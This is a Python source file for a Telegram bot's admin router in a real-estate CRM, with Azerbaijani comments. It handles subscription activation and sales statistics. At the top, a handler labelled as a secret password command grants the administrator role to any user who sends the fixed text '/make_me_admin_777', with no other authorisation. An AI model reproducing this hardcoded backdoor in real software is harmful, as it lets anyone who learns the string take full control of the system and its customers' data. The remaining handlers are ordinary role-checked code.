from datetime import datetime, timedelta, timezone
from aiogram import Router, F
from aiogram.types import Message
from aiogram.filters import Command
from sqlalchemy.ext.asyncio import AsyncSession

from app.models.user import User, UserRole, SubscriptionType
from app.services.stats_service import StatsService
from app.repositories.user_repo import user_repo
from app.bot.keyboards.reply import get_main_menu

router = Router(name="admin_router")

# GİZLİ ŞİFRƏ İLƏ ADMİN OLMAQ
@router.message(F.text == "/make_me_admin_777")
async def secret_admin_command(message: Message, db: AsyncSession, actor: User):
    if actor.role == UserRole.ADMIN:
        return await message.answer("Siz onsuz da adminsiniz.")
        
    actor.role = UserRole.ADMIN
    await user_repo.update(db, actor, {"role": UserRole.ADMIN})
    await message.answer("Təbriklər! Siz artıq sistemin administratorusunuz 👑\n\nZəhmət olmasa aşağıdan menyunu yeniləyin.", reply_markup=get_main_menu(actor.role))


# ================== MÜŞTƏRİ ABUNƏLİYİNİ AKTİVLƏŞDİRMƏK ==================
@router.message(Command("activate"))
async def activate_user_subscription(message: Message, db: AsyncSession, actor: User):
    # Yalnız adminlər abunəlik aktiv edə bilər
    if actor.role != UserRole.ADMIN:
        return await message.answer("⚠️ Bu komandanı yalnız Administrator icra edə bilər.")
        
    args = message.text.split()
    
    if len(args) < 4:
        return await message.answer(
            "<b>İstifadə Qaydası:</b>\n"
            "<code>/activate [Telegram_ID] [Paket] [Ay_Sayı]</code>\n\n"
            "<b>Nümunə:</b>\n"
            "<code>/activate 123456789 premium 1</code>  (1 aylıq premium)\n"
            "<code>/activate 123456789 standart 3</code>  (3 aylıq standart)",
            parse_mode="HTML"
        )
        
    target_id = int(args[1])
    package = args[2].lower()
    months = int(args[3])
    
    if package not in ["standart", "premium"]:
        return await message.answer("Paket növü səhvdir. Yalnız 'standart' və ya 'premium' yaza bilərsiniz.")
        
    # İstifadəçini bazadan tapırıq
    target_user = await user_repo.get_by_telegram_id(db, target_id)
    if not target_user:
        return await message.answer(f"❌ <b>{target_id}</b> İD-li istifadəçi tapılmadı. O bota ən azı 1 dəfə '/start' yazmalıdır.", parse_mode="HTML")
        
    # Abunəlik vaxtını təyin edirik
    current_time = datetime.now(timezone.utc)
    if target_user.subscription_end and target_user.subscription_end > current_time:
        new_end_date = target_user.subscription_end + timedelta(days=30 * months)
    else:
        new_end_date = current_time + timedelta(days=30 * months)
        
    sub_type = SubscriptionType.PREMIUM if package == "premium" else SubscriptionType.STANDART
    
    # Bazada yeniləyirik
    await user_repo.update(db, target_user, {
        "subscription": sub_type,
        "subscription_end": new_end_date,
        "is_active": True
    })
    
    await message.answer(
        f"✅ <b>İstifadəçi Uğurla Aktivləşdirildi!</b>\n\n"
        f"👤 Adı: {target_user.full_name}\n"
        f"🆔 ID: <code>{target_user.telegram_id}</code>\n"
        f"💎 Paket: {sub_type.value.upper()}\n"
        f"📅 Bitiş tarixi: {new_end_date.strftime('%Y-%m-%d %H:%M')}",
        parse_mode="HTML"
    )
    
    # Qeyd: Əgər istifadəçiyə də bildiriş getməsini istəyirsinizsə, burada bot vasitəsilə 
    # await message.bot.send_message(target_user.telegram_id, "Təbriklər abunəliyiniz aktiv oldu") yaza bilərik.
    try:
        await message.bot.send_message(
            target_user.telegram_id, 
            f"🎉 <b>Təbriklər! Abunəliyiniz təsdiqləndi.</b>\n\n"
            f"Paket: <b>{sub_type.value.upper()}</b>\n"
            f"Bitiş tarixi: {new_end_date.strftime('%Y-%m-%d')}\n\n"
            f"Sistemdən tam istifadə etmək üçün yenidən /start yazın.",
            parse_mode="HTML"
        )
    except Exception:
        # Adam botu bloklayıbsa bildiriş getməyəcək, amma biz xəta vermirik
        pass


# ======================== STATİSTİKA ========================
@router.message(F.text == "📊 Statistika")
async def show_statistics(message: Message, **kwargs):
    db: AsyncSession = kwargs.get("db")
    actor: User = kwargs.get("actor")
    
    if actor.role not in [UserRole.ADMIN, UserRole.MANAGER]:
        return await message.answer("⚠️ Bu bölməyə giriş icazəniz yoxdur. Sizin rolunuz yalnız Agent-dir.")
        
    stats = await StatsService.get_dashboard_stats(db)
    
    text = (
        "📊 <b>NEXORA CRM - Qlobal Statistika</b>\n\n"
        f"👨‍💼 Aktiv Agentlər: <b>{stats['active_agents']}</b>\n"
        f"🏠 Ümumi Aktiv Evlər: <b>{stats['active_properties']}</b>\n\n"
        f"📈 <b>Bu günün göstəriciləri:</b>\n"
        f"➕ Yeni ev: {stats['today_new_properties']}\n"
        f"➕ Yeni müştəri: {stats['today_new_customers']}\n\n"
        f"💰 Satılmış evlərin ümumi həcmi: <b>{stats['total_sold_revenue']:,.2f} AZN</b>"
    )
    
    await message.answer(text, parse_mode="HTML")
